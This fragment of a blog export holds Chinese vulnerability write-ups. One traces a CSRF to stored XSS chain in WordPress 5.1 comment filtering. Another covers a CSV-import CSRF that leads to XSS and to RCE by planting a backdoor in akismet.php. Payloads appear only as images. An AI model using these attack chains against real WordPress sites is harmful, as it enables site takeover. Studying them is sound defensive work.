alt=\"KiTR9s.png\"></p>\n<p>需要注意的是，我们构造的js语句插入在csv中哪个字段，这里的map_from map_to就要写对应的字段名称，否则导入时会出错</p>\n<p>管理员访问该payload，csrf漏洞将会被触发。表单被提交后，首先完成mapping步骤，接着，程序通过ajax自动发送import以及done步骤的请求，完成后续步骤。稍加等待，我们恶意的产品数据将会被导入，当管理员访问产品页面时，插入的js脚本将会被执行</p>\n<h1 id=\"XSS-to-RCE\"><a href=\"#XSS-to-RCE\" class=\"headerlink\" title=\"XSS to RCE\"></a>XSS to RCE</h1><p>Wordpress中允许博客管理员编辑管理控制台中的主题和插件文件。通过滥用XSS漏洞，攻击者可以在远程服务器上执行任意PHP代码。</p>\n<p>例如我们可以通过编辑插件功能，在后台写下payload</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTW3n.png\" alt=\"KiTW3n.png\"></p>\n<p>编辑插件页面如上图</p>\n<p>我们构造恶意csv如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiTfcq.png\" alt=\"KiTfcq.png\"></p>\n<p>构造csrf表单如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiThj0.png\" alt=\"KiThj0.png\"></p>\n<p>当管路员访问我们的csrf表单，恶意的csv将会被导入</p>\n<p>当管理员访问该产品页面时，插入产品描述内容中的js脚本将会被执行，akismet.php中的内容将会被修改，从而达到的插入后门的作用，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/10/16/KiT5uV.png\" alt=\"KiT5uV.png\"></p>"},{"title":"WordPress 5.1 CSRF to RCE 漏洞详解","date":"2019-03-21T07:42:58.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\nWordPress是使用PHP语言开发的博客平台，用户可以在支持PHP和MySQL数据库的服务器上架设属于自己的网站。也可以把 WordPress当作一个内容管理系统（CMS）来使用。  \n前些日子，RIPS放了一个WordPress5.1的CSRF漏洞通过\n本文将对此次CSRF漏洞进行详细分析，RCE相关的分析见后续分析文章\n<!--more-->\n\n<h2>预备知识</h2>\n在wordpress中，超级管理员是可以在评论中写入任何代码而不被过滤的\n\n比如，在评论中输入\n\n<img class=\"alignnone size-full wp-image-14805\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/add1.png\" alt=\"\" width=\"420\" height=\"53\" />\n\n<img class=\"alignnone size-full wp-image-14760\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/1-1.png\" alt=\"\" width=\"741\" height=\"374\" />\n\n直接弹框\n&nbsp;\n\n但是超级管理员在提交评论表单时，wordpress需要校验其Nonce值\n\n想理解这个漏洞，首先要了解下wordpress的Nonce ( number used once )防御机制\n\nWordpress的Nonce ( number used once ) 机制，是用来防止CSRF而引进的。WordPress会为一些请求提供一个随机数进行校验，以防止未授权的请求的发生。\n\n&nbsp;\n\n来看下wordpress的Nonce机制是如何使用的:\n\n1、使用wp_create_nonce生成 nonce值：\n\n<img class=\"alignnone size-full wp-image-14762\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/2-1.png\" alt=\"\" width=\"756\" height=\"483\" />\n\n可见，其实nonce值与$i、$action、$uid、$token有关\n\n这里的$i 是nonce创建的时间相关变量，由wp_nonce_tick()生成，其余的$action、$uid、$token很好理解。\n\n由这里我们可以看出，nonce的生成，与其操作也是有关系的\n\n&nbsp;\n\n2、将生成的 nonce传递给需要提交时验证的前端模板\n\n3、需要验证的表单被提交后，验证其中nonce，例如下图中，本次漏洞点\n\n<img class=\"alignnone size-full wp-image-14763\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/3-1.png\" alt=\"\" width=\"832\" height=\"180\" />\n\nNonce讲解完毕，言归正传，分析本次漏洞\n<h2>漏洞分析</h2>\n理论上，如果没法通过Nonce验证，后续的操作会直接被终止，而且在csrf攻击中，攻击者是没有办法伪造管理员实时的Nonce值。\n\n但从本次漏洞处来看，如下图\n\n<img class=\"alignnone size-full wp-image-14764\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/4-1.png\" alt=\"\" width=\"771\" height=\"140\" />\n\n这里虽然没有通过Nonce的验证（wp_verify_nonce）,但是并未终止操作。Wordpress在这里使用了两个过滤方法对后续的数据进行过滤。\n\n&nbsp;\n\n至于为什么没有终止，而采用了如下的过滤逻辑，据说是因为WordPress其中有一些特殊的功能例如trackbacks and pingbacks会受到该值的影响，笔者没有进一步考究，感兴趣的同学可以自己分析下。\n\n&nbsp;\n\n到目前为止，我们虽然没有合法的nonce值，但我们的payload仍然幸存，\n\n接下来，看看逻辑里的 kses_init_filters()这个方法\n\n<img class=\"alignnone size-full wp-image-14765\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/5-1.png\" alt=\"\" width=\"718\" height=\"200\" />\n\n&nbsp;\n<h3>超级管理员&amp;非法Nonce情况:</h3>\n我们用超级管理员身份提交一个评论，但是改包，把&amp;_wp_unfiltered_html_comment改为空，使其通过不了Nonce校验，如下图\n\n<img class=\"alignnone size-full wp-image-14766\" title=\"\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/6-1.png\" alt=\"\" width=\"1139\" height=\"433\" />\n\n&nbsp;\n\n果然进入下图断点\n\n<img class=\"alignnone size-full wp-image-14767\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/7-1.png\" alt=\"\" width=\"805\" height=\"144\" />\n\n&nbsp;\n\n紧接着，进入如下断点\n\n<img class=\"alignnone size-full wp-image-14768\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/8-1.png\" alt=\"\" width=\"754\" height=\"223\" />\n\n使用wp_filter_post_kses对输入的数据进行过滤\n\n&nbsp;\n<h3>普通用户情况：</h3>\n此时用普通用户进行评论\n\n<img class=\"alignnone size-full wp-image-14769\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/9-1.png\" alt=\"\" width=\"728\" height=\"539\" />\n\n<img class=\"alignnone size-full wp-image-14770\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/10-1.png\" alt=\"\" width=\"698\" height=\"195\" />\n\n直接调用wp_filter_kses进行过滤\n\n&nbsp;\n\n以上思路以及明朗了\n\n超级管理员&amp;合法nonce -&gt;不做任何过滤\n\n超级管理员&amp;不合法nonce -&gt;wp_filter_post_kses\n\n普通用户 –&gt;wp_filter_kses\n\n&nbsp;\n\n先来看看普通用户提交和超级管理员无nonce提交时调用的过滤函数有什么区别\n\n&nbsp;\n\n普通用户提交过滤函数：\n\n<img class=\"alignnone size-full wp-image-14771\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/11-2.png\" alt=\"\" width=\"780\" height=\"60\" />\n\n&nbsp;\n\n超级管理员无nonce提交过滤函数：\n\n<img class=\"alignnone size-full wp-image-14772\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/12-1.png\" alt=\"\" width=\"808\" height=\"62\" />\n\n&nbsp;\n\n可以看出只是wp_kses中第二个参数不同，一个是current_filter()，一个是’post’\n\n这里不同的，对应wp_kses中，应该是allowed_html参数值\n\n&nbsp;\n\n这里举个普通用户评论的例子，普通用户提交评论，current_filter()方法返回的值是pre_comment_content，也就是说allowed_html参数值为pre_comment_content。可见下图动态调试结果\n\n<img class=\"alignnone size-full wp-image-14773\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/13.png\" alt=\"\" width=\"903\" height=\"345\" />\n\n对应的，超级管理员无nonce提交时，这里的allowed_html参数值为”post”\n\n&nbsp;\n\n那么allowed_html值不同，到底会有什么区别呢？\n\n$allowed_html被传入wp_kses_split方法\n\n<img class=\"alignnone size-full wp-image-14774\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/14-1.png\" alt=\"\" width=\"812\" height=\"167\" />\n\n&nbsp;\n\n进一步看wp_kses_split\n\n<img class=\"alignnone size-full wp-image-14776\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/15-1.png\" alt=\"\" width=\"822\" height=\"153\" />\n\n注意到这里$pass_allowed_html = $allowed_html;\n\n现在$allowed_html传给了$pass_allowed_html\n\n我们要看看这两个不同的$allowed_html最终传递到哪里被用到\n\n&nbsp;\n\n跟进_wp_kses_split_callback，$allowed_html传给了wp_kses_split2\n\n<img class=\"alignnone size-full wp-image-14777\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/16-1.png\" alt=\"\" width=\"843\" height=\"88\" />\n\n跟进wp_kses_split2，$allowed_html被传给了wp_kses_attr<img class=\"alignnone size-full wp-image-14778\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/17.png\" alt=\"\" width=\"711\" height=\"127\" />\n\n跟进wp_kses_attr，$allowed_html被传给了wp_kses_allowed_html\n\n<img class=\"alignnone size-full wp-image-14780\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/18-1.png\" alt=\"\" width=\"755\" height=\"147\" />\n\n跟进wp_kses_allowed_html\n\n一路跟踪，到了这里，$allowed_html终于有作用了\n\n<img class=\"alignnone size-full wp-image-14790\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/add.png\" alt=\"\" width=\"653\" height=\"141\" />\n\n回顾一下，\n\n超级管理员无nonce提交时，这里的allowed_html参数值为”post”\n\n普通用户提交评论时， allowed_html参数值为”pre_comment_content”。\n\n首先看超级管理员无nonce提交吗，allowed_html参数值为”post”，进入post分支\n\n<img class=\"alignnone size-full wp-image-14781\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/19-1.png\" alt=\"\" width=\"837\" height=\"131\" />\n\n可以看到这里有一个wp_kses_allowed_html方法，跟进去看看<img class=\"alignnone size-full wp-image-14782\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/20-1.png\" alt=\"\" width=\"825\" height=\"399\" />\n\n相当于一个白名单机制，再看看白名单上都有什么，看看$allowedposttags\n\n<img class=\"alignnone size-full wp-image-14783\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/21-1.png\" alt=\"\" width=\"320\" height=\"239\" />\n\n这里’a’标签运行’rel’属性\n\n&nbsp;\n\n再看看普通用户提交评论时， allowed_html参数值为”pre_comment_content”情况。\n\n<img class=\"alignnone size-full wp-image-14784\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/22-1.png\" alt=\"\" width=\"702\" height=\"84\" />\n\n&nbsp;\n\n这里白名单是$allowedtags\n\n<img class=\"alignnone size-full wp-image-14785\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/23.png\" alt=\"\" width=\"356\" height=\"178\" />\n\n只允许’href’与’title’\n\n看到这里，明白wp_filter_post_kses 、wp_filter_ kses两个过滤函数有什么区别了吗？\n\n&nbsp;\n\n可以用’rel’属性与不可以用’rel’,有什么区别呢？如何造成这次的csrf呢？看下图\n\nwp-includes\\formatting.php\n\n<img class=\"alignnone size-full wp-image-14786\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/24.png\" alt=\"\" width=\"853\" height=\"534\" />\n\n可以看到属性值在没有被转义处理的情况下就再次拼接在一起，\n\n在a标签最终被拼接时，title的属性会被封装到双引号中，这样我们就可以构造数据使其闭合，从而执行js\n\nPayload：\n\n<img class=\"alignnone size-full wp-image-14806\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/add2.png\" alt=\"\" width=\"482\" height=\"51\" />\n\n被双引号包裹后\n\n<img class=\"alignnone size-full wp-image-14810\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/add3-1.png\" alt=\"\" width=\"459\" height=\"36\" />\n\n单鼠标放置时，js执行\n\n&nbsp;\n\n但是这个wp_rel_nofollow_callback哪里来的呢？\n\n&nbsp;\n\n看一下wordpress对comment_content都采用了哪些默认的过滤器\n\n&nbsp;\n\n\\wp-includes\\default-filters.php\n\n<img class=\"alignnone size-full wp-image-14787\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/25.png\" alt=\"\" width=\"801\" height=\"42\" /> <img class=\"alignnone size-full wp-image-14788\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/26.png\" alt=\"\" width=\"782\" height=\"109\" /> 上图三个分别是：\n\nwp_rel_nofollow\n\nconvert_invalid_entities\n\nbalanceTags\n\n&nbsp;\n\n看下wp_rel_nofollow\n\n<img class=\"alignnone size-full wp-image-14789\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/27.png\" alt=\"\" width=\"655\" height=\"139\" />\n\nwp_rel_nofollow_callback是在这里被加载并使用的\n\n&nbsp;\n<h2>结语</h2>\n最后，整理下流程\n\n此次漏洞的流程是：\n\n(超级管理员&amp;不合法nonce) -&gt;(wp_filter_post_kses)-&gt;(’rel’属性在白名单中逃逸)-&gt;(wordpress加载默认评论内容过滤器wp_rel_nofollow)-&gt;(加载wp_rel_nofollow_callback) -&gt;(未过滤并用双引号包裹title值)-&gt;(js执行)-&gt;(RCE)","source":"_posts/wordpress-5-1-1-csrf-rce.md","raw":"---\ntitle: WordPress 5.1 CSRF to RCE 漏洞详解\ndate: 2019-03-21 15:42:58\ntags: web漏洞分析\ncategories: 技术\n\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\nWordPress是使用PHP语言开发的博客平台，用户可以在支持PHP和MySQL数据库的服务器上架设属于自己的网站。也可以把 WordPress当作一个内容管理系统（CMS）来使用。  \n前些日子，RIPS放了一个WordPress5.1的CSRF漏洞通过\n本文将对此次CSRF漏洞进行详细分析，RCE相关的分析见后续分析文章\n<!--more-->\n\n<h2>预备知识</h2>\n在wordpress中，超级管理员是可以在评论中写入任何代码而不被过滤的\n\n比如，在评论中输入\n\n<img class=\"alignnone size-full wp-image-14805\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/add1.png\" alt=\"\" width=\"420\" height=\"53\" />\n\n<img class=\"alignnone size-full wp-image-14760\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/1-1.png\" alt=\"\" width=\"741\" height=\"374\" />\n\n直接弹框\n&nbsp;\n\n但是超级管理员在提交评论表单时，wordpress需要校验其Nonce值\n\n想理解这个漏洞，首先要了解下wordpress的Nonce ( number used once )防御机制\n\nWordpress的Nonce ( number used once ) 机制，是用来防止CSRF而引进的。WordPress会为一些请求提供一个随机数进行校验，以防止未授权的请求的发生。\n\n&nbsp;\n\n来看下wordpress的Nonce机制是如何使用的:\n\n1、使用wp_create_nonce生成 nonce值：\n\n<img class=\"alignnone size-full wp-image-14762\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/2-1.png\" alt=\"\" width=\"756\" height=\"483\" />\n\n可见，其实nonce值与$i、$action、$uid、$token有关\n\n这里的$i 是nonce创建的时间相关变量，由wp_nonce_tick()生成，其余的$action、$uid、$token很好理解。\n\n由这里我们可以看出，nonce的生成，与其操作也是有关系的\n\n&nbsp;\n\n2、将生成的 nonce传递给需要提交时验证的前端模板\n\n3、需要验证的表单被提交后，验证其中nonce，例如下图中，本次漏洞点\n\n<img class=\"alignnone size-full wp-image-14763\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/3-1.png\" alt=\"\" width=\"832\" height=\"180\" />\n\nNonce讲解完毕，言归正传，分析本次漏洞\n<h2>漏洞分析</h2>\n理论上，如果没法通过Nonce验证，后续的操作会直接被终止，而且在csrf攻击中，攻击者是没有办法伪造管理员实时的Nonce值。\n\n但从本次漏洞处来看，如下图\n\n<img class=\"alignnone size-full wp-image-14764\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/4-1.png\" alt=\"\" width=\"771\" height=\"140\" />\n\n这里虽然没有通过Nonce的验证（wp_verify_nonce）,但是并未终止操作。Wordpress在这里使用了两个过滤方法对后续的数据进行过滤。\n\n&nbsp;\n\n至于为什么没有终止，而采用了如下的过滤逻辑，据说是因为WordPress其中有一些特殊的功能例如trackbacks and pingbacks会受到该值的影响，笔者没有进一步考究，感兴趣的同学可以自己分析下。\n\n&nbsp;\n\n到目前为止，我们虽然没有合法的nonce值，但我们的payload仍然幸存，\n\n接下来，看看逻辑里的 kses_init_filters()这个方法\n\n<img class=\"alignnone size-full wp-image-14765\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/5-1.png\" alt=\"\" width=\"718\" height=\"200\" />\n\n&nbsp;\n<h3>超级管理员&amp;非法Nonce情况:</h3>\n我们用超级管理员身份提交一个评论，但是改包，把&amp;_wp_unfiltered_html_comment改为空，使其通过不了Nonce校验，如下图\n\n<img class=\"alignnone size-full wp-image-14766\" title=\"\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/6-1.png\" alt=\"\" width=\"1139\" height=\"433\" />\n\n&nbsp;\n\n果然进入下图断点\n\n<img class=\"alignnone size-full wp-image-14767\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/7-1.png\" alt=\"\" width=\"805\" height=\"144\" />\n\n&nbsp;\n\n紧接着，进入如下断点\n\n<img class=\"alignnone size-full wp-image-14768\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/8-1.png\" alt=\"\" width=\"754\" height=\"223\" />\n\n使用wp_filter_post_kses对输入的数据进行过滤\n\n&nbsp;\n<h3>普通用户情况：</h3>\n此时用普通用户进行评论\n\n<img class=\"alignnone size-full wp-image-14769\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/9-1.png\" alt=\"\" width=\"728\" height=\"539\" />\n\n<img class=\"alignnone size-full wp-image-14770\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/10-1.png\" alt=\"\" width=\"698\" height=\"195\" />\n\n直接调用wp_filter_kses进行过滤\n\n&nbsp;\n\n以上思路以及明朗了\n\n超级管理员&amp;合法nonce -&gt;不做任何过滤\n\n超级管理员&amp;不合法nonce -&gt;wp_filter_post_kses\n\n普通用户 –&gt;wp_filter_kses\n\n&nbsp;\n\n先来看看普通用户提交和超级管理员无nonce提交时调用的过滤函数有什么区别\n\n&nbsp;\n\n普通用户提交过滤函数：\n\n<img class=\"alignnone size-full wp-image-14771\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/11-2.png\" alt=\"\" width=\"780\" height=\"60\" />\n\n&nbsp;\n\n超级管理员无nonce提交过滤函数：\n\n<img class=\"alignnone size-full wp-image-14772\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/12-1.png\" alt=\"\" width=\"808\" height=\"62\" />\n\n&nbsp;\n\n可以看出只是wp_kses中第二个参数不同，一个是current_filter()，一个是’post’\n\n这里不同的，对应wp_kses中，应该是allowed_html参数值\n\n&nbsp;\n\n这里举个普通用户评论的例子，普通用户提交评论，current_filter()方法返回的值是pre_comment_content，也就是说allowed_html参数值为pre_comment_content。可见下图动态调试结果\n\n<img class=\"alignnone size-full wp-image-14773\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/13.png\" alt=\"\" width=\"903\" height=\"345\" />\n\n对应的，超级管理员无nonce提交时，这里的allowed_html参数值为”post”\n\n&nbsp;\n\n那么allowed_html值不同，到底会有什么区别呢？\n\n$allowed_html被传入wp_kses_split方法\n\n<img class=\"alignnone size-full wp-image-14774\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/14-1.png\" alt=\"\" width=\"812\" height=\"167\" />\n\n&nbsp;\n\n进一步看wp_kses_split\n\n<img class=\"alignnone size-full wp-image-14776\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/15-1.png\" alt=\"\" width=\"822\" height=\"153\" />\n\n注意到这里$pass_allowed_html = $allowed_html;\n\n现在$allowed_html传给了$pass_allowed_html\n\n我们要看看这两个不同的$allowed_html最终传递到哪里被用到\n\n&nbsp;\n\n跟进_wp_kses_split_callback，$allowed_html传给了wp_kses_split2\n\n<img class=\"alignnone size-full wp-image-14777\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/16-1.png\" alt=\"\" width=\"843\" height=\"88\" />\n\n跟进wp_kses_split2，$allowed_html被传给了wp_kses_attr<img class=\"alignnone size-full wp-image-14778\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/17.png\" alt=\"\" width=\"711\" height=\"127\" />\n\n跟进wp_kses_attr，$allowed_html被传给了wp_kses_allowed_html\n\n<img class=\"alignnone size-full wp-image-14780\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/18-1.png\" alt=\"\" width=\"755\" height=\"147\" />\n\n跟进wp_kses_allowed_html\n\n一路跟踪，到了这里，$allowed_html终于有作用了\n\n<img class=\"alignnone size-full wp-image-14790\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/add.png\" alt=\"\" width=\"653\" height=\"141\" />\n\n回顾一下，\n\n超级管理员无nonce提交时，这里的allowed_html参数值为”post”\n\n普通用户提交评论时， allowed_html参数值为”pre_comment_content”。\n\n首先看超级管理员无nonce提交吗，allowed_html参数值为”post”，进入post分支\n\n<img class=\"alignnone size-full wp-image-14781\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/19-1.png\" alt=\"\" width=\"837\" height=\"131\" />\n\n可以看到这里有一个wp_kses_allowed_html方法，跟进去看看<img class=\"alignnone size-full wp-image-14782\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/20-1.png\" alt=\"\" width=\"825\" height=\"399\" />\n\n相当于一个白名单机制，再看看白名单上都有什么，看看$allowedposttags\n\n<img class=\"alignnone size-full wp-image-14783\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/21-1.png\" alt=\"\" width=\"320\" height=\"239\" />\n\n这里’a’标签运行’rel’属性\n\n&nbsp;\n\n再看看普通用户提交评论时， allowed_html参数值为”pre_comment_content”情况。\n\n<img class=\"alignnone size-full wp-image-14784\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/22-1.png\" alt=\"\" width=\"702\" height=\"84\" />\n\n&nbsp;\n\n这里白名单是$allowedtags\n\n<img class=\"alignnone size-full wp-image-14785\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/23.png\" alt=\"\" width=\"356\" height=\"178\" />\n\n只允许’href’与’title’\n\n看到这里，明白wp_filter_post_kses 、wp_filter_ kses两个过滤函数有什么区别了吗？\n\n&nbsp;\n\n可以用’rel’属性与不可以用’rel’,有什么区别呢？如何造成这次的csrf呢？看下图\n\nwp-includes\\formatting.php\n\n<img class=\"alignnone size-full wp-image-14786\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/24.png\" alt=\"\" width=\"853\" height=\"534\" />\n\n可以看到属性值在没有被转义处理的情况下就再次拼接在一起，\n\n在a标签最终被拼接时，title的属性会被封装到双引号中，这样我们就可以构造数据使其闭合，从而执行js\n\nPayload：\n\n<img class=\"alignnone size-full wp-image-14806\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/add2.png\" alt=\"\" width=\"482\" height=\"51\" />\n\n被双引号包裹后\n\n<img class=\"alignnone size-full wp-image-14810\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/add3-1.png\" alt=\"\" width=\"459\" height=\"36\" />\n\n单鼠标放置时，js执行\n\n&nbsp;\n\n但是这个wp_rel_nofollow_callback哪里来的呢？\n\n&nbsp;\n\n看一下wordpress对comment_content都采用了哪些默认的过滤器\n\n&nbsp;\n\n\\wp-includes\\default-filters.php\n\n<img class=\"alignnone size-full wp-image-14787\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/25.png\" alt=\"\" width=\"801\" height=\"42\" /> <img class=\"alignnone size-full wp-image-14788\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/26.png\" alt=\"\" width=\"782\" height=\"109\" /> 上图三个分别是：\n\nwp_rel_nofollow\n\nconvert_invalid_entities\n\nbalanceTags\n\n&nbsp;\n\n看下wp_rel_nofollow\n\n<img class=\"alignnone size-full wp-image-14789\" src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/27.png\" alt=\"\" width=\"655\" height=\"139\" />\n\nwp_rel_nofollow_callback是在这里被加载并使用的\n\n&nbsp;\n<h2>结语</h2>\n最后，整理下流程\n\n此次漏洞的流程是：\n\n(超级管理员&amp;不合法nonce) -&gt;(wp_filter_post_kses)-&gt;(’rel’属性在白名单中逃逸)-&gt;(wordpress加载默认评论内容过滤器wp_rel_nofollow)-&gt;(加载wp_rel_nofollow_callback) -&gt;(未过滤并用双引号包裹title值)-&gt;(js执行)-&gt;(RCE)","slug":"wordpress-5-1-1-csrf-rce","published":1,"updated":"2020-10-27T09:27:09.758Z","_id":"ckgrozua6005awsa9gwq0d284","comments":1,"layout":"post","photos":[],"link":"","content":"<p>WordPress是使用PHP语言开发的博客平台，用户可以在支持PHP和MySQL数据库的服务器上架设属于自己的网站。也可以把 WordPress当作一个内容管理系统（CMS）来使用。<br>前些日子，RIPS放了一个WordPress5.1的CSRF漏洞通过<br>本文将对此次CSRF漏洞进行详细分析，RCE相关的分析见后续分析文章</p>\n<a id=\"more\"></a>\n\n<h2>预备知识</h2>\n在wordpress中，超级管理员是可以在评论中写入任何代码而不被过滤的\n\n<p>比如，在评论中输入</p>\n<img class=\"alignnone size-full wp-image-14805\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/add1.png\" alt=\"\" width=\"420\" height=\"53\" />\n\n<img class=\"alignnone size-full wp-image-14760\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/1-1.png\" alt=\"\" width=\"741\" height=\"374\" />\n\n<p>直接弹框<br>&nbsp;</p>\n<p>但是超级管理员在提交评论表单时，wordpress需要校验其Nonce值</p>\n<p>想理解这个漏洞，首先要了解下wordpress的Nonce ( number used once )防御机制</p>\n<p>Wordpress的Nonce ( number used once ) 机制，是用来防止CSRF而引进的。WordPress会为一些请求提供一个随机数进行校验，以防止未授权的请求的发生。</p>\n<p>&nbsp;</p>\n<p>来看下wordpress的Nonce机制是如何使用的:</p>\n<p>1、使用wp_create_nonce生成 nonce值：</p>\n<img class=\"alignnone size-full wp-image-14762\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/2-1.png\" alt=\"\" width=\"756\" height=\"483\" />\n\n<p>可见，其实nonce值与$i、$action、$uid、$token有关</p>\n<p>这里的$i 是nonce创建的时间相关变量，由wp_nonce_tick()生成，其余的$action、$uid、$token很好理解。</p>\n<p>由这里我们可以看出，nonce的生成，与其操作也是有关系的</p>\n<p>&nbsp;</p>\n<p>2、将生成的 nonce传递给需要提交时验证的前端模板</p>\n<p>3、需要验证的表单被提交后，验证其中nonce，例如下图中，本次漏洞点</p>\n<img class=\"alignnone size-full wp-image-14763\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/3-1.png\" alt=\"\" width=\"832\" height=\"180\" />\n\n<p>Nonce讲解完毕，言归正传，分析本次漏洞</p>\n<h2>漏洞分析</h2>\n理论上，如果没法通过Nonce验证，后续的操作会直接被终止，而且在csrf攻击中，攻击者是没有办法伪造管理员实时的Nonce值。\n\n<p>但从本次漏洞处来看，如下图</p>\n<img class=\"alignnone size-full wp-image-14764\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/4-1.png\" alt=\"\" width=\"771\" height=\"140\" />\n\n<p>这里虽然没有通过Nonce的验证（wp_verify_nonce）,但是并未终止操作。Wordpress在这里使用了两个过滤方法对后续的数据进行过滤。</p>\n<p>&nbsp;</p>\n<p>至于为什么没有终止，而采用了如下的过滤逻辑，据说是因为WordPress其中有一些特殊的功能例如trackbacks and pingbacks会受到该值的影响，笔者没有进一步考究，感兴趣的同学可以自己分析下。</p>\n<p>&nbsp;</p>\n<p>到目前为止，我们虽然没有合法的nonce值，但我们的payload仍然幸存，</p>\n<p>接下来，看看逻辑里的 kses_init_filters()这个方法</p>\n<img class=\"alignnone size-full wp-image-14765\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/5-1.png\" alt=\"\" width=\"718\" height=\"200\" />\n\n<p>&nbsp;</p>\n<h3>超级管理员&amp;非法Nonce情况:</h3>\n我们用超级管理员身份提交一个评论，但是改包，把&amp;_wp_unfiltered_html_comment改为空，使其通过不了Nonce校验，如下图\n\n<img class=\"alignnone size-full wp-image-14766\" title=\"\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/6-1.png\" alt=\"\" width=\"1139\" height=\"433\" />\n\n<p>&nbsp;</p>\n<p>果然进入下图断点</p>\n<img class=\"alignnone size-full wp-image-14767\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/7-1.png\" alt=\"\" width=\"805\" height=\"144\" />\n\n<p>&nbsp;</p>\n<p>紧接着，进入如下断点</p>\n<img class=\"alignnone size-full wp-image-14768\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/8-1.png\" alt=\"\" width=\"754\" height=\"223\" />\n\n<p>使用wp_filter_post_kses对输入的数据进行过滤</p>\n<p>&nbsp;</p>\n<h3>普通用户情况：</h3>\n此时用普通用户进行评论\n\n<img class=\"alignnone size-full wp-image-14769\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/9-1.png\" alt=\"\" width=\"728\" height=\"539\" />\n\n<img class=\"alignnone size-full wp-image-14770\" src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/03/10-1.png\" alt=\"\" width=\"698\" height=\"195\" />\n\n<p>直接调用wp_filter_kses进行过滤</p>\n<p>&nbsp;</p>\n<p>以上思路以及明朗了</p>\n<p>超级管理员&amp;合法nonce -&gt;不做任何过滤</p>\n<p>超级管理员&amp;不合法nonce 